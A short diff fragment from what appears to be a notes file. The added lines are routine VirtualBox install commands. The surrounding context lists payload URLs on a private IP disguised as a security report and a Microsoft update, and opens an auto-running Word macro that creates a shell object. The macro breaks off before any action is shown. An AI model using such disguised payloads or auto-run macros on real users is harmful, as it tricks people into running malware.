@@ -18,6 +18,16 @@ http://192.168.1.137/payloads/relatorio_seguranca.exe
 
 http://192.168.1.137:8080/microsoft_update.page.zip
 
+sudo apt update && sudo apt upgrade -y
+sudo apt install -y build-essential dkms linux-headers-$(uname -r)
+sudo apt install virtualbox -y
+virtualbox
+sudo /sbin/vboxconfig
+
+cat /etc/os-release
+
+
+
 Sub AutoOpen()
     On Error Resume Next
     Dim objShell As Object
